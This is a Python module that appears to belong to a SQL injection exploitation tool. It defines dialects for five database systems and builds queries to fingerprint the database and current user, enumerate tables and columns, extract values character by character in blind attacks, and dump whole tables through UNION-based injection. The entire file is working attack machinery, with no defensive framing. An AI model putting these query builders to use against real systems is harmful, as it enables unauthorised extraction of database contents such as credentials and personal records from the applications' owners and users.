"""Per-DBMS SQL dialects used by the data-extraction stage.

Each Dialect knows how to express, for its database:
  - the "facts" we extract (version / current user / current database),
  - a query that aggregates the current schema's table names,
  - a query listing a table's columns, and a per-row value expression (for
    dumping whole tables via the UNION channel),
  - the string functions (substring/length/char-code) the blind extractor needs,
  - how to concatenate a value between two delimiters (for UNION extraction).

When the DBMS is unknown we fall back to MySQL syntax, which is the most common.
"""

from __future__ import annotations

from dataclasses import dataclass

# Separator placed between a row's cell values so we can split them back apart.
CELL_SEP = "|~|"


@dataclass
class Dialect:
    name: str
    facts: dict[str, str]          # fact name -> scalar SQL expression
    tables_query: str              # scalar subquery -> comma-joined table names
    columns_tmpl: str              # scalar subquery -> comma-joined column names ({t}=table)
    substr: str = "SUBSTRING"      # SUBSTRING(str, pos, len)
    char_code: str = "ASCII"       # ASCII(char) -> int code
    length: str = "LENGTH"         # LENGTH(str) -> int
    concat_tmpl: str = "CONCAT('{s}',{expr},'{e}')"
    # Table-dump building blocks
    ident_open: str = "`"
    ident_close: str = "`"
    cast_tmpl: str = "CAST({c} AS CHAR)"
    limit_tmpl: str = "LIMIT {o},1"
    row_concat_style: str = "func"  # func (CONCAT) | pipe (||) | plus (+)

    # ---- delimited concat (UNION single-value read) ----
    def concat(self, start: str, expr: str, end: str) -> str:
        return self.concat_tmpl.format(s=start, expr=expr, e=end)

    # ---- blind helpers ----
    def substring(self, expr: str, pos: int) -> str:
        return f"{self.substr}(({expr}),{pos},1)"

    def char_at_code(self, expr: str, pos: int) -> str:
        return f"{self.char_code}({self.substring(expr, pos)})"

    def length_of(self, expr: str) -> str:
        return f"{self.length}(({expr}))"

    # ---- table-dump helpers ----
    def qi(self, name: str) -> str:
        """Quote an identifier (table/column name)."""
        return f"{self.ident_open}{name}{self.ident_close}"

    def columns_query(self, table: str) -> str:
        return self.columns_tmpl.format(t=table)

    def count_query(self, table: str) -> str:
        return f"(SELECT COUNT(*) FROM {self.qi(table)})"

    def _join_cells(self, exprs: list[str]) -> str:
        sep = f"'{CELL_SEP}'"
        if self.row_concat_style == "func":
            inner = ("," + sep + ",").join(exprs)
            return f"CONCAT({inner})"
        if self.row_concat_style == "plus":
            return ("+" + sep + "+").join(exprs)
        return ("||" + sep + "||").join(exprs)  # pipe

    def row_value_expr(self, columns: list[str], table: str, offset: int) -> str:
        cells = [f"COALESCE({self.cast_tmpl.format(c=self.qi(c))},'NULL')" for c in columns]
        body = self._join_cells(cells)
        return f"(SELECT {body} FROM {self.qi(table)} {self.limit_tmpl.format(o=offset)})"


_MYSQL = Dialect(
    name="MySQL",
    facts={
        "version": "@@version",
        "current_user": "current_user()",
        "current_db": "database()",
    },
    tables_query=(
        "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c) "
        "FROM information_schema.tables WHERE table_schema=database())"
    ),
    columns_tmpl=(
        "(SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) "
        "FROM information_schema.columns "
        "WHERE table_schema=database() AND table_name='{t}')"
    ),
    concat_tmpl="CONCAT('{s}',{expr},'{e}')",
    ident_open="`",
    ident_close="`",
    cast_tmpl="CAST({c} AS CHAR)",
    limit_tmpl="LIMIT {o},1",
    row_concat_style="func",
)

_POSTGRES = Dialect(
    name="PostgreSQL",
    facts={
        "version": "version()",
        "current_user": "current_user",
        "current_db": "current_database()",
    },
    tables_query=(
        "(SELECT string_agg(table_name,',') "
        "FROM information_schema.tables WHERE table_schema='public')"
    ),
    columns_tmpl=(
        "(SELECT string_agg(column_name,',') FROM information_schema.columns "
        "WHERE table_schema='public' AND table_name='{t}')"
    ),
    substr="SUBSTRING",
    char_code="ASCII",
    length="LENGTH",
    concat_tmpl="'{s}'||({expr})::text||'{e}'",
    ident_open='"',
    ident_close='"',
    cast_tmpl="({c})::text",
    limit_tmpl="LIMIT 1 OFFSET {o}",
    row_concat_style="pipe",
)

_MSSQL = Dialect(
    name="Microsoft SQL Server",
    facts={
        "version": "@@version",
        "current_user": "SYSTEM_USER",
        "current_db": "DB_NAME()",
    },
    tables_query="(SELECT STRING_AGG(name,',') FROM sys.tables)",
    columns_tmpl="(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('{t}'))",
    substr="SUBSTRING",
    char_code="ASCII",
    length="LEN",
    concat_tmpl="'{s}'+CAST(({expr}) AS NVARCHAR(4000))+'{e}'",
    ident_open="[",
    ident_close="]",
    cast_tmpl="CAST({c} AS NVARCHAR(4000))",
    limit_tmpl="ORDER BY 1 OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
    row_concat_style="plus",
)

_SQLITE = Dialect(
    name="SQLite",
    facts={
        "version": "sqlite_version()",
    },
    tables_query="(SELECT group_concat(name) FROM sqlite_master WHERE type='table')",
    columns_tmpl="(SELECT group_concat(name) FROM pragma_table_info('{t}'))",
    substr="SUBSTR",
    char_code="UNICODE",
    length="LENGTH",
    concat_tmpl="'{s}'||({expr})||'{e}'",
    ident_open='"',
    ident_close='"',
    cast_tmpl="CAST({c} AS TEXT)",
    limit_tmpl="LIMIT {o},1",
    row_concat_style="pipe",
)

_ORACLE = Dialect(
    name="Oracle",
    facts={
        "version": "(SELECT banner FROM v$version WHERE rownum=1)",
        "current_user": "USER",
    },
    tables_query=(
        "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) "
        "FROM user_tables)"
    ),
    columns_tmpl=(
        "(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) "
        "FROM user_tab_columns WHERE table_name='{t}')"
    ),
    substr="SUBSTR",
    char_code="ASCII",
    length="LENGTH",
    concat_tmpl="'{s}'||({expr})||'{e}'",
    ident_open='"',
    ident_close='"',
    cast_tmpl="CAST({c} AS VARCHAR2(4000))",
    limit_tmpl="OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
    row_concat_style="pipe",
)

_DIALECTS: dict[str, Dialect] = {
    "MySQL": _MYSQL,
    "PostgreSQL": _POSTGRES,
    "Microsoft SQL Server": _MSSQL,
    "SQLite": _SQLITE,
    "Oracle": _ORACLE,
}


def get_dialect(dbms_name: str | None) -> Dialect:
    """Return the dialect for a DBMS name, defaulting to MySQL when unknown."""
    if dbms_name and dbms_name in _DIALECTS:
        return _DIALECTS[dbms_name]
    return _MYSQL
